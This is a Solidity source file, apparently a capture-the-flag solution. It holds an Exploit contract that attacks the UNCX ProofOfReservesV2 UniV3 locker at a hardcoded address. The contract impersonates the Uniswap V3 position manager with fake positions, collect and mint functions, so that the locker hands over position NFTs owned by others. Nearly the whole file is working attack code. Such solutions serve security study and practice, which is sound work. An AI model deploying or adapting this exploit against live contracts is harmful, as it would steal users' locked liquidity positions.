// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";

import "src/IUNCX_ProofOfReservesV2_UniV3.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;

    IUNCX_ProofOfReservesV2_UniV3 private immutable TARGET =
        IUNCX_ProofOfReservesV2_UniV3(0x7f5C649856F900d15C83741f45AE46f5C6858234);

    INonfungiblePositionManager private immutable UNI_V3 =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);

    uint256 private targetTokenId1;
    uint256 private targetTokenId2;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external {
        uint256 totalAmount = UNI_V3.balanceOf(address(TARGET));
        if (totalAmount > 30) totalAmount = 30;

        for (uint256 i = 0; i < totalAmount; i += 2) {
            uint256 amountOwned = UNI_V3.balanceOf(address(TARGET));
            targetTokenId1 = UNI_V3.tokenOfOwnerByIndex(address(TARGET), 0);
            targetTokenId2 = UNI_V3.tokenOfOwnerByIndex(address(TARGET), amountOwned > 1 ? 1 : 0);

            TARGET.lock(
                IUNCX_ProofOfReservesV2_UniV3.LockParams({
                    nftPositionManager: INonfungiblePositionManager(address(this)),
                    nft_id: 0,
                    dustRecipient: address(this),
                    owner: address(this),
                    additionalCollector: address(this),
                    collectAddress: address(this),
                    unlockDate: block.timestamp + 1,
                    countryCode: 0,
                    feeName: "DEFAULT",
                    r: new bytes[](0)
                })
            );

            UNI_V3.safeTransferFrom(UNI_V3.ownerOf(targetTokenId1), address(this), targetTokenId1);
            if (amountOwned > 1) {
                UNI_V3.safeTransferFrom(UNI_V3.ownerOf(targetTokenId2), address(this), targetTokenId2);
            }
        }
    }

    function safeTransferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function positions(uint256)
        external
        view
        returns (uint96, address, address, address, uint24, int24, int24, uint128, uint256, uint256, uint128, uint128)
    {
        return (0, address(this), address(UNI_V3), address(UNI_V3), 0, 0, 0, 1, 0, 0, 0, 0);
    }

    function approve(address, uint256) external {}

    function factory() external view returns (address) {
        return address(this);
    }

    function getPool(address, address, uint24) external view returns (address) {
        return address(this);
    }

    function feeAmountTickSpacing(uint24) external pure returns (uint24) {
        return 1;
    }

    function decreaseLiquidity(INonfungiblePositionManager.DecreaseLiquidityParams calldata)
        external
        pure
        returns (uint256, uint256)
    {
        return (0, 0);
    }

    function collect(INonfungiblePositionManager.CollectParams calldata) external view returns (uint256, uint256) {
        return (targetTokenId1, targetTokenId2);
    }

    function mint(INonfungiblePositionManager.MintParams calldata)
        external
        pure
        returns (uint256, uint128, uint256, uint256)
    {
        return (0, 0, type(uint256).max, type(uint256).max);
    }

    function burn(uint256) external {}

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return Exploit.onERC721Received.selector;
    }
}

contract Solve is CTFSolver {
    function solve(address challenge, address) internal override {
        new Exploit(Challenge(challenge)).exploit();
    }
}
